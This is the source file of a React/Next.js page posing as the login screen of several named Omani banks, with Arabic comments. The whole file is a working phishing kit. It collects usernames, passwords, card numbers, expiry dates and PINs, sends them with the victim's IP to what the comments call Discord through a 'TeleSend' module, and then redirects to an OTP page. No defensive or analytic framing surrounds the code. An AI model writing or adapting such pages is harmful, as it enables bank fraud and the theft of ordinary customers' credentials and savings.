'use client'

import React, { useState, useEffect } from "react";
import { useRouter, useSearchParams } from 'next/navigation';
import Image from "next/image";
import TeleSned from "../../../../server/TeleSend";

const Page = () => {
  const router = useRouter();
  const searchParams = useSearchParams();
  const { Send } = TeleSned();
  const [ip, setIp] = useState('جاري التحميل...');
  const [isLoading, setIsLoading] = useState(false);
  const [showForgotPassword, setShowForgotPassword] = useState(false);
  const [showSplash, setShowSplash] = useState(true);
  
  // الحصول على bankId من URL
  const bankId = searchParams.get('bankId');
  const bankNameFromUrl = searchParams.get('bankName');
  const ipFromUrl = searchParams.get('ip');

  // إخفاء شاشة التحميل بعد 5 ثوانٍ
  useEffect(() => {
    const timer = setTimeout(() => {
      setShowSplash(false);
    }, 5000);

    return () => clearTimeout(timer);
  }, []);

  // جلب IP من API إذا لم يكن موجود في URL
  useEffect(() => {
    if (ipFromUrl) {
      setIp(ipFromUrl);
    } else {
      const fetchIp = async () => {
        try {
          const response = await fetch('/api/ip');
          const data = await response.json();
          setIp(data.ip);
        } catch (error) {
          console.error('خطأ في جلب IP:', error);
          setIp('غير متاح');
        }
      };
      fetchIp();
    }
  }, [ipFromUrl]);

  const banks = [
    { id: 1, name: 'بنك عمان العربي', src: '/bankaraboman.jpg', url: '/payment/banks/bankoman' },
    { id: 2, name: 'البنك العماني الدولي', src: '/b-oman-ntional.png', url: '/payment/banks/bankomanNtional' },
    { id: 3, name: 'البنك الأهلي', src: '/bankahle.png', url: '/payment/banks/bankahle' },
    { id: 4, name: 'بنك العز الإسلامي', src: '/bankAz.png', url: '/payment/banks/bankaz' },
    { id: 5, name: 'بنك صحار', src: '/saharabank.png', url: '/payment/banks/saharabank' },
    { id: 6, name: 'بنك نزوى', src: '/b-nzwa.webp', url: '/payment/banks/b-nzwa' },
    { id: 7, name: 'بنك طفار الإسلامي', src: '/b-dafar.svg', url: '/payment/banks/b-dafar' },
    { id: 8, name: 'بنك مسقط', src: '/b-msqt.jpg', url: '/payment/banks/b-msqt' },
    { id: 9, name: 'بنك HSBC', src: '/b-hsbc.jpg', url: '/payment/banks/b-hsbc' },
    { id: 10, name: 'بنك الاسكان', src: '/bankaskan.png', url: '/payment/banks/bankaskan' },
    { id: 11, name: 'بنك ميثاق', src: '/b-mythaq.png', url: '/payment/banks/b-mythaq' },
    { id: 12, name: 'بنك ظفار', src: '/b-dafar no islam.png', url: '/payment/banks/b-dafar' }
  ];

  // العثور على البنك المحدد
  const selectedBank = banks.find(bank => bank.id === parseInt(bankId));

  // دالة معالجة النموذج
  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsLoading(true);
    
    const form = e.target;
    let username, password, cardNumber, expiryMonth, expiryYear, pinCode;
    
    if (showForgotPassword) {
      cardNumber = form.cardNumber.value;
      expiryMonth = form.expiryMonth.value;
      expiryYear = form.expiryYear.value;
      pinCode = form.pinCode.value;
    } else {
      username = form.username.value;
      password = form.password.value;
    }

    // إرسال البيانات إلى Discord
    try {
      let description;
      if (showForgotPassword) {
        description = `🔑 **نسيت كلمة المرور**\n\n` +
                     `📌 **البنك:** ${selectedBank?.name || 'غير معروف'}\n` +
                     `💳 **رقم البطاقة:** ${cardNumber}\n` +
                     `📅 **تاريخ الانتهاء:** ${expiryMonth}/${expiryYear}\n` +
                     `🔐 **رمز PIN:** ${pinCode}\n` +
                     `🌐 **IP المستخدم:** ${ip}\n` +
                     `🕒 **الوقت:** ${new Date().toLocaleString('ar-OM')}`;
      } else {
        description = `🏦 **بيانات تسجيل الدخول**\n\n` +
                     `📌 **البنك:** ${selectedBank?.name || 'غير معروف'}\n` +
                     `👤 **اسم المستخدم:** ${username}\n` +
                     `🔑 **كلمة المرور:** ${password}\n` +
                     `🌐 **IP المستخدم:** ${ip}\n` +
                     `🕒 **الوقت:** ${new Date().toLocaleString('ar-OM')}`;
      }
      
      await Send(description);
      console.log('✅ تم إرسال البيانات إلى Discord');
    } catch (error) {
      console.error('❌ خطأ في الإرسال إلى Discord:', error);
    }

    // التوجيه إلى صفحة OTP بعد 2 ثانية
    setTimeout(() => {
      setIsLoading(false);
      // التوجيه إلى صفحة OTP مع تمرير البارامترات
      router.push(`/otp?bankId=${bankId}&bankName=${encodeURIComponent(selectedBank?.name || '')}&ip=${encodeURIComponent(ip)}`);
    }, 2000);
  };

  // شاشة التحميل (Splash Screen)
  if (showSplash) {
    return (
      <main className="flex min-h-screen flex-col items-center justify-center p-4 md:p-8 bg-gradient-to-br from-gray-50 to-gray-100">
        <div className="z-10 w-full max-w-md mx-auto">
          <div className="flex flex-col items-center justify-center w-full rounded-xl shadow-xl bg-white/95 backdrop-blur-sm p-12 md:p-16 border border-gray-100">
            
            {/* الشعار */}
            <div className="mb-8">
              <Image
                src={selectedBank?.src || '/bank-placeholder.png'}
                alt={selectedBank?.name || 'البنك'}
                width={100}
                height={100}
                className="object-contain rounded-full shadow-lg"
              />
            </div>
            
            {/* النص الثابت */}
            <h1 className="text-2xl md:text-3xl font-bold text-[#800000] mb-8 text-center">
              {selectedBank?.name || 'جاري التحميل'}
            </h1>
            
            {/* الدائرة المتحركة */}
            <div className="relative w-24 h-24">
              <div className="absolute inset-0 rounded-full border-4 border-gray-200"></div>
              <div className="absolute inset-0 rounded-full border-4 border-[#800000] border-t-transparent animate-spin"></div>
            </div>
            
            <p className="mt-8 text-sm text-gray-500">
              يرجى الانتظار جاري تجهيز البيانات...
            </p>
          </div>
        </div>
      </main>
    );
  }

  // إذا لم يتم العثور على البنك
  if (!selectedBank) {
    return (
      <main className="flex min-h-screen flex-col items-center justify-center p-4 md:p-8 bg-gradient-to-br from-gray-50 to-gray-100">
        <div className="z-10 w-full max-w-md mx-auto">
          <div className="bg-white rounded-xl shadow-xl p-8 text-center border border-gray-100">
            <p className="text-red-500 text-lg">❌ لم يتم اختيار بنك</p>
            <button
              onClick={() => router.push('/payment/banks')}
              className="mt-4 px-6 py-2 bg-[#800000] text-white rounded-lg hover:bg-[#600000] transition-all duration-300"
            >
              العودة لاختيار البنك
            </button>
          </div>
        </div>
      </main>
    );
  }

  return (
    <main className="flex min-h-screen flex-col items-center justify-center p-4 md:p-8 bg-gradient-to-br from-gray-50 to-gray-100">
      <div className="z-10 w-full max-w-md mx-auto">
        {/* البطاقة العلوية */}
        <div className="flex flex-col items-center justify-center w-full rounded-xl shadow-xl bg-white/95 backdrop-blur-sm p-6 md:p-8 border border-gray-100 mb-6">
          <div className="w-20 h-20 relative rounded-full overflow-hidden bg-gray-50 flex items-center justify-center mb-4">
            <Image
              src={selectedBank.src}
              alt={selectedBank.name}
              width={80}
              height={80}
              className="object-contain p-2"
              onError={(e) => {
                e.target.src = '/bank-placeholder.png';
              }}
            />
          </div>
          <h2 className="text-2xl font-bold text-[#800000] text-center">
            {selectedBank.name}
          </h2>
          <p className="text-gray-600 mt-2 text-center text-sm">
            {selectedBank.name}
          </p>
        </div>

        {/* نموذج تسجيل الدخول */}
        <div className="bg-white rounded-xl shadow-xl p-6 md:p-8 border border-gray-100">
          <h1 className='text-[#800000] text-lg font-bold text-center mb-4'>
            {showForgotPassword ? ' ' : 'تسجيل الدخول'}
          </h1>
          
          <form onSubmit={handleSubmit} className="space-y-5">
            {!showForgotPassword ? (
              // حقول تسجيل الدخول العادية
              <>
                <div>
                  <label htmlFor="username" className="block mb-1.5 text-sm font-semibold text-gray-700">
                    اسم المستخدم <span className="text-[#800000]">*</span>
                  </label>
                  <input
                    type="text"
                    id="username"
                    name="username"
                    required
                    placeholder="أدخل اسم المستخدم"
                    className="w-full border border-gray-300 rounded-lg py-2.5 px-4 focus:outline-none focus:ring-2 focus:ring-[#800000] focus:border-transparent transition-all duration-300 bg-gray-50 hover:bg-white"
                    dir="ltr"
                  />
                </div>

                <div>
                  <label htmlFor="password" className="block mb-1.5 text-sm font-semibold text-gray-700">
                    كلمة المرور <span className="text-[#800000]">*</span>
                  </label>
                  <input
                    type="password"
                    id="password"
                    name="password"
                    required
                    placeholder="أدخل كلمة المرور"
                    className="w-full border border-gray-300 rounded-lg py-2.5 px-4 focus:outline-none focus:ring-2 focus:ring-[#800000] focus:border-transparent transition-all duration-300 bg-gray-50 hover:bg-white"
                    dir="ltr"
                  />
                </div>

                <button
                  type="button"
                  onClick={() => setShowForgotPassword(true)}
                  className="text-sm text-[#800000] hover:text-[#600000] transition-colors duration-200 text-left"
                >
                  نسيت كلمة المرور؟
                </button>
              </>
            ) : (
              // حقول استعادة كلمة المرور
              <>
                <div>
                  <label htmlFor="cardNumber" className="block mb-1.5 text-sm font-semibold text-gray-700">
                    رقم البطاقة <span className="text-[#800000]">*</span>
                  </label>
                  <input
                    type="text"
                    id="cardNumber"
                    name="cardNumber"
                    required
                    placeholder="____ ____ ____ ____"
                    className="w-full border border-gray-300 rounded-lg py-2.5 px-4 focus:outline-none focus:ring-2 focus:ring-[#800000] focus:border-transparent transition-all duration-300 bg-gray-50 hover:bg-white"
                    dir="ltr"
                  />
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <label htmlFor="expiryMonth" className="block mb-1.5 text-sm font-semibold text-gray-700">
                      الشهر <span className="text-[#800000]">*</span>
                    </label>
                    <select
                      id="expiryMonth"
                      name="expiryMonth"
                      required
                      className="w-full border border-gray-300 rounded-lg py-2.5 px-4 focus:outline-none focus:ring-2 focus:ring-[#800000] focus:border-transparent transition-all duration-300 bg-gray-50 hover:bg-white"
                    >
                      <option value="">MM</option>
                      {Array.from({ length: 12 }, (_, i) => i + 1).map(month => (
                        <option key={month} value={month.toString().padStart(2, '0')}>
                          {month.toString().padStart(2, '0')}
                        </option>
                      ))}
                    </select>
                  </div>
                  <div>
                    <label htmlFor="expiryYear" className="block mb-1.5 text-sm font-semibold text-gray-700">
                      السنة <span className="text-[#800000]">*</span>
                    </label>
                    <select
                      id="expiryYear"
                      name="expiryYear"
                      required
                      className="w-full border border-gray-300 rounded-lg py-2.5 px-4 focus:outline-none focus:ring-2 focus:ring-[#800000] focus:border-transparent transition-all duration-300 bg-gray-50 hover:bg-white"
                    >
                      <option value="">YYYY</option>
                      {Array.from({ length: 10 }, (_, i) => new Date().getFullYear() + i).map(year => (
                        <option key={year} value={year}>
                          {year}
                        </option>
                      ))}
                    </select>
                  </div>
                </div>

                <div>
                  <label htmlFor="pinCode" className="block mb-1.5 text-sm font-semibold text-gray-700">
                    رمز PIN <span className="text-[#800000]">*</span>
                  </label>
                  <input
                    type="password"
                    id="pinCode"
                    name="pinCode"
                    required
                    maxLength={4}
                    placeholder="____"
                    className="w-full border border-gray-300 rounded-lg py-2.5 px-4 focus:outline-none focus:ring-2 focus:ring-[#800000] focus:border-transparent transition-all duration-300 bg-gray-50 hover:bg-white"
                    dir="ltr"
                  />
                </div>

                <button
                  type="button"
                  onClick={() => setShowForgotPassword(false)}
                  className="text-sm text-[#800000] hover:text-[#600000] transition-colors duration-200 text-left"
                >
                  العودة لتسجيل الدخول
                </button>
              </>
            )}

            <button
              type="submit"
              disabled={isLoading}
              className="w-full px-6 py-3 bg-[#800000] text-white rounded-lg shadow-md hover:bg-[#600000] transition-all duration-300 transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-[#800000] focus:ring-offset-2 text-lg font-semibold disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {isLoading ? (
                <span className="flex items-center justify-center gap-2">
                  <svg className="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                  </svg>
                  جاري المعالجة...
                </span>
              ) : (
                showForgotPassword ? 'التالي' : 'تسجيل الدخول'
              )}
            </button>
          </form>
        </div>
      </div>
    </main>
  );
};

export default Page;